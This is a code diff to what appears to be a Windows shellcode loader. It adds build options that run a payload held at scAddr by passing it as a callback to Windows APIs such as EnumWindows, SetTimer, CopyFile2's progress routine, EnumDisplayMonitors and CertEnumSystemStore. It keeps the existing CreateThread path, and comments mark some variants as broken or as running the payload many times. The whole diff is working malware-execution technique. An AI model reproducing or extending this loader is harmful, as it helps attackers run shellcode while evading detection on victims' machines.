@@ -51,7 +51,61 @@ int entry(int argc, char** argv) {
 #endif
 
     // Run payload via callback
-#ifdef EXEC_THREAD
+#ifdef EXEC_CERTENUMSYSTEMSTORE
+    // FIXME This is broken right now, something with wincrypt.h
+    #include <wincrypt.h>
+    CertEnumSystemStore(
+        CERT_SYSTEM_STORE_CURRENT_USER,
+        0,
+        0,
+        (PFN_CERT_ENUM_SYSTEM_STORE)scAddr
+    );
+#elifdef EXEC_COPYFILE2
+    COPYFILE2_EXTENDED_PARAMETERS params;
+
+    params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS;
+    params.dwSize = {sizeof(params)};
+    params.pfCancel = FALSE;
+    params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)scAddr;
+    params.pvCallbackContext = nullptr;
+
+    DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
+    CopyFile2(
+        L"C:\\Windows\\DirectX.log",
+        L"C:\\Windows\\Temp\\backup.log",
+        &params
+    );
+#elifdef EXEC_CRYPTENUMOIDINFO
+    // FIXME This is broken right now, something with wincrypt.h
+    #include <wincrypt.h>
+    CryptEnumOIDInfo(0, 0, 0, (PFN_CRYPT_ENUM_OID_INFO)scAddr);
+#elifdef EXEC_ENUMCALENDARINFO
+    EnumCalendarInfoExEx(
+        (CALINFO_ENUMPROCEXEX)scAddr,
+        LOCALE_NAME_INVARIANT,
+        ENUM_ALL_CALENDARS,
+        0,
+        CAL_SMONTHNAME1,
+        0
+    );
+#elifdef EXEC_ENUMDISPLAYMONITORS
+    EnumDisplayMonitors(0, 0, (MONITORENUMPROC)scAddr, 0);
+#elifdef EXEC_ENUMPWRSCHEMES
+    // FIXME This is broken right now, something with powrprof.h
+    #include <powrprof.h>
+    EnumPwrSchemes((PWRSCHEMESENUMPROC)scAddr, 0);
+#elifdef EXEC_ENUMPROPS
+    // NOTE runs payload twice
+    EnumPropsW(GetTopWindow(0), (PROPENUMPROCW)scAddr);
+#elifdef EXEC_ENUMWINDOWS
+    // FIXME dangerous, runs payload NUMEROUS times
+    EnumWindows((WNDENUMPROC)scAddr, 0);
+#elifdef EXEC_SETTIMER
+    MSG msg;
+    SetTimer(0, 0, 0, (TIMERPROC)scAddr);
+    GetMessageW(&msg, 0, 0, 0);
+    DispatchMessageW(&msg);
+#elifdef EXEC_THREAD
     HANDLE t = CreateThread(
         0, 0, (LPTHREAD_START_ROUTINE)scAddr, 0, 0, 0
     );
